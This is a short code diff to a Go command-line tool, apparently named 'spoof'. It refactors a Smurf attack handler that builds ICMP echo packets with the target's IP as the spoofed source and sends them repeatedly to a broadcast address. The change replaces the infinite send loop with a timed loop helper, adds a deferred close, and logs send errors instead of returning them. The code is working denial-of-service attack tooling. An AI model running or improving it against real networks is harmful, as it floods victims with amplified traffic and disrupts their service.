@@ -3,10 +3,12 @@ package main
 import (
 	"encoding/hex"
 	"fmt"
+	"log"
 	"net"
 	"os"
 	"time"
 
+	"github.com/adrianosela/spoof/exec"
 	"github.com/adrianosela/spoof/payloads"
 	"github.com/adrianosela/spoof/wire"
 
@@ -56,6 +58,7 @@ func smurfHandler(ctx *cli.Context) error {
 	if err != nil {
 		return err
 	}
+	defer w.Close()
 
 	payload, err := payloads.Build(payloads.TypeICMPEcho, payloads.Config{
 		SrcIP:  target,
@@ -68,12 +71,14 @@ func smurfHandler(ctx *cli.Context) error {
 	}
 
 	fmt.Printf(banner, target, broadcast, every.String(), hex.Dump(payload))
-	for {
+
+	exec.Loop(every, func() {
 		if err = w.Inject(payload); err != nil {
-			return err
+			log.Println(err)
 		}
-		time.Sleep(every)
-	}
+	})
+
+	return nil
 }
 
 func main() {
